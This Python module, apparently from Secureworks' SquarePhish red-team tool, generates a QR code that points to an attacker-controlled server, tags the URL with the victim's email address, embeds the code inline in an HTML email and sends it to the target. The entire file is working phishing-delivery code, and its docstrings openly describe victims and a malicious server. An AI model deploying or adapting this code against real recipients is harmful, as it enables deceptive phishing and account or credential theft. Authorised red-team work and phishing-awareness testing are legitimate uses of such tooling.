# Copyright 2022 Secureworks
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import io
import logging
import pyqrcode  # type: ignore
from configparser import ConfigParser
from email.message import EmailMessage
from email.mime.image import MIMEImage
from squarephish.modules.emailer import Emailer


class QRCodeEmail:
    """Class to handle initial QR code emails"""

    def _generate_qrcode(
        self,
        server: str,
        port: int,
        endpoint: str,
        email: str,
    ) -> bytes:
        """Generate a QR code for a given URL

        :param server:   malicious server domain/IP
        :param port:     port malicious server is running on
        :param endpoint: malicious server endpoint to request
        :param email:    TO email address of victim
        :returns:        QR code raw bytes
        """
        try:
            endpoint = endpoint.strip("/")
            url = f"https://{server}:{port}/{endpoint}?email={email}"
            qrcode = pyqrcode.create(url)

            # Get the QR code as raw bytes and store as BytesIO object
            qrcode_bytes = io.BytesIO()
            qrcode.png(qrcode_bytes, scale=6)

            # Return the QR code bytes
            return qrcode_bytes.getvalue()

        except Exception as e:
            logging.error(f"Error generating QR code: {e}")
            return None

    @classmethod
    def send_qrcode(
        cls,
        email: str,
        config: ConfigParser,
        emailer: Emailer,
    ) -> bool:
        """Send initial QR code to victim pointing to our malicious URL

        :param email:   target victim email address to send email to
        :param config:  configuration settings
        :param emailer: emailer object to send emails
        :returns:       bool if the email was successfully sent
        """
        qrcode = cls._generate_qrcode(
            cls,
            config.get("EMAIL", "SQUAREPHISH_SERVER"),
            config.get("EMAIL", "SQUAREPHISH_PORT"),
            config.get("EMAIL", "SQUAREPHISH_ENDPOINT"),
            email,
        )

        if not qrcode:
            logging.error("Failed to generate QR code")
            return False

        msg = EmailMessage()
        msg["To"] = email
        msg["From"] = config.get("EMAIL", "FROM_EMAIL")
        msg["Subject"] = config.get("EMAIL", "SUBJECT")

        email_template = config.get("EMAIL", "EMAIL_TEMPLATE")
        msg.set_content(email_template, subtype="html")
        msg.add_alternative(email_template, subtype="html")

        # Create a new MIME image to embed into the email as inline
        logo = MIMEImage(qrcode)
        logo.add_header("Content-ID", f"<qrcode.png>")  # <img src"cid:qrcode.png">
        logo.add_header("X-Attachment-Id", "qrcode.png")
        logo["Content-Disposition"] = f"inline; filename=qrcode.png"

        msg.get_payload()[1].make_mixed()
        msg.get_payload()[1].attach(logo)

        return emailer.send_email(msg)
